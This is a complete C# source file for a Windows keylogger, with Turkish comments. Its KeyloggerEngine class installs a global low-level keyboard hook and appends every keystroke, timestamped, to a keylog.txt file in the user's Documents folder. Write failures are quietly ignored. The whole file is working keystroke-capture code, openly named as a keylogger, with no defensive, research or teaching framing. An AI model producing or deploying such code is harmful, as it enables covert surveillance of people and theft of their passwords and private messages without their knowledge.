using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace Keylogger
{
    public class KeyloggerEngine
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static string logFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "keylog.txt");

        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        public KeyloggerEngine()
        {
            _hookID = SetHook(_proc);
        }

        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string keyName = GetKeyName(vkCode);
                
                // Tuş basımını dosyaya kaydet
                LogKey(keyName);
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static string GetKeyName(int vkCode)
        {
            // Özel tuşlar için kontrol
            switch (vkCode)
            {
                case 8: return "[BACKSPACE]";
                case 9: return "[TAB]";
                case 13: return "[ENTER]";
                case 16: return "[SHIFT]";
                case 17: return "[CTRL]";
                case 18: return "[ALT]";
                case 20: return "[CAPS LOCK]";
                case 27: return "[ESC]";
                case 32: return " ";
                case 46: return "[DELETE]";
                case 91: return "[WINDOWS]";
                default:
                    // Normal karakterler için
                    return ((Keys)vkCode).ToString();
            }
        }

        private static void LogKey(string key)
        {
            try
            {
                string logEntry = $"{DateTime.Now:yyyy-MM-dd HH:mm:ss} - {key}{Environment.NewLine}";
                File.AppendAllText(logFilePath, logEntry, Encoding.UTF8);
            }
            catch (Exception ex)
            {
                // Hata durumunda sessizce devam et
                Console.WriteLine($"Log yazma hatası: {ex.Message}");
            }
        }

        public void StopLogging()
        {
            UnhookWindowsHookEx(_hookID);
        }

        public static string GetLogFilePath()
        {
            return logFilePath;
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}